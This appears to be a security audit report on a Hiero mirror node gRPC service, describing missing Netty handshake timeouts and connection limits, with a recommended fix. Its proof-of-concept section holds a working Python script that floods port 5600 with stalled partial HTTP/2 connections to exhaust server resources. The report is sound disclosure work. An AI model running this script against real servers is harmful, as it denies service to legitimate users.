### Title
Missing Handshake Timeout and Connection Limit in NettyServerBuilder Enables HTTP/2 Handshake Exhaustion DoS

### Summary
The `grpcServerConfigurer()` bean in `GrpcConfiguration.java` configures `NettyServerBuilder` with only a per-connection RPC call limit and a custom executor. No `handshakeTimeout()`, `maxConnectionIdle()`, `maxConnectionAge()`, or total connection count limit is set. An unprivileged attacker can open a large number of TCP connections that initiate but never complete the HTTP/2 handshake, holding Netty channel resources and file descriptors for the duration of the library's default timeout (or indefinitely if the default is `Long.MAX_VALUE`), degrading or denying service to legitimate gRPC clients.

### Finding Description

**Exact code location:**
`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, lines 28–35; `grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, lines 11–15.

```java
// GrpcConfiguration.java lines 31-34
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
};
```

```java
// NettyProperties.java line 14
private int maxConcurrentCallsPerConnection = 5;
```

**Root cause:** The `ServerBuilderCustomizer` lambda applies exactly two settings to `NettyServerBuilder`:
1. A custom executor.
2. `maxConcurrentCallsPerConnection` (default: 5).

`maxConcurrentCallsPerConnection` governs the number of concurrent gRPC calls on an **already-established** connection. It has zero effect on connections that are still in the TCP-accepted / HTTP/2-preface / TLS-handshake phase. A grep across the entire repository for `handshakeTimeout`, `maxConnectionIdle`, `maxConnectionAge`, and `keepAliveTimeout` returns **zero matches**, confirming none of these guards are set anywhere.

**Exploit flow:**
1. Attacker opens thousands of raw TCP connections to port 5600.
2. For each connection, the attacker sends a valid TCP SYN (accepted by the OS) and optionally a partial TLS `ClientHello` or HTTP/2 preface, then stops sending data.
3. Netty accepts each connection and allocates a `Channel`, a pipeline, and associated buffers. The connection sits in the handshake state.
4. Without an explicit `handshakeTimeout`, the server relies on the grpc-netty library default. In grpc-java ≤ ~1.39 this default is `Long.MAX_VALUE` (infinite); in later versions it is 120 seconds. At grpc-java **1.80.0** (the version pinned in `build.gradle.kts` line 22), the library default is 120 seconds — but the code never calls `serverBuilder.handshakeTimeout(...)` to enforce a tighter bound.
5. With 120-second windows, an attacker sustaining ~1,000 new stalled connections per second accumulates 120,000 open channels simultaneously, exhausting the OS file-descriptor limit (typically 65,535 per process), Netty's event-loop thread pool, and JVM heap.
6. Legitimate clients receive `UNAVAILABLE` or connection-refused errors; the gRPC service stops processing topic subscription and transaction queries.

**Why existing checks fail:**
- `maxConcurrentCallsPerConnection = 5` is irrelevant: it is enforced only after the HTTP/2 connection is fully established.
- The GCP gateway `timeoutSec: 20` (Helm chart `charts/hedera-mirror-grpc/values.yaml` line 72) applies to backend request timeouts for routed traffic, not to raw TCP connections that bypass the gateway or stall before HTTP/2 is negotiated.
- No IP-level rate limiting or maximum total connection count is configured in the Netty layer.

### Impact Explanation
A successful attack exhausts Netty channel resources and OS file descriptors on the gRPC pod, causing all new legitimate connections to be refused. This directly disrupts the mirror node's ability to serve topic message subscriptions and network service queries. Because the gRPC service is the primary streaming interface for Hedera transaction data consumers, sustained exhaustion constitutes a complete denial of service for that component. Severity: **High** (availability impact, no authentication required, publicly reachable port).

### Likelihood Explanation
No privileges, accounts, or special knowledge are required. Any host with TCP connectivity to port 5600 can execute this attack using standard tools (`hping3`, `ncat`, or a trivial Python script). The attack is repeatable and can be sustained indefinitely. The only practical barrier is network-level filtering (firewall, cloud load balancer ACLs), which is an operational control outside the application code and not guaranteed to be present in all deployments.

### Recommendation
In the `grpcServerConfigurer()` lambda, add explicit protective limits to `NettyServerBuilder`:

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
    // Add these:
    serverBuilder.handshakeTimeout(nettyProperties.getHandshakeTimeout().toMillis(),
                                   java.util.concurrent.TimeUnit.MILLISECONDS); // e.g. 10s
    serverBuilder.maxConnectionIdle(nettyProperties.getMaxConnectionIdle().toMillis(),
                                    java.util.concurrent.TimeUnit.MILLISECONDS); // e.g. 5m
    serverBuilder.maxConnectionAge(nettyProperties.getMaxConnectionAge().toMillis(),
                                   java.util.concurrent.TimeUnit.MILLISECONDS);  // e.g. 1h
};
```

Add corresponding fields to `NettyProperties` with safe defaults (e.g., `handshakeTimeout = 10s`). Additionally, consider enforcing a maximum total connection count at the OS/infrastructure level (e.g., `iptables` connlimit, GCP Cloud Armor, or a Kubernetes NetworkPolicy with connection-rate limits).

### Proof of Concept

```python
# Requires: Python 3, no special libraries
import socket, time, threading

TARGET_HOST = "<grpc-service-ip>"
TARGET_PORT = 5600
NUM_CONNECTIONS = 5000

sockets = []

def open_stall(i):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_HOST, TARGET_PORT))
        # Send a partial HTTP/2 client preface (first 6 bytes only, never completing)
        s.send(b"PRI * ")
        sockets.append(s)
    except Exception as e:
        print(f"[{i}] failed: {e}")

threads = [threading.Thread(target=open_stall, args=(i,)) for i in range(NUM_CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()

print(f"Holding {len(sockets)} stalled connections. Sleeping 130s...")
time.sleep(130)  # Exceed the 120s library default to observe resource exhaustion
```

**Expected result:** The gRPC server's file-descriptor count approaches the process limit; new legitimate `grpc.subscribe` calls receive `UNAVAILABLE` or `connection refused`. Server logs show Netty channel allocation failures or OOM pressure. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-35)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L11-15)
```java
public class NettyProperties {

    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
}
```

**File:** build.gradle.kts (L22-22)
```text
    set("grpcVersion", "1.80.0")
```

**File:** charts/hedera-mirror-grpc/values.yaml (L72-72)
```yaml
      timeoutSec: 20
```
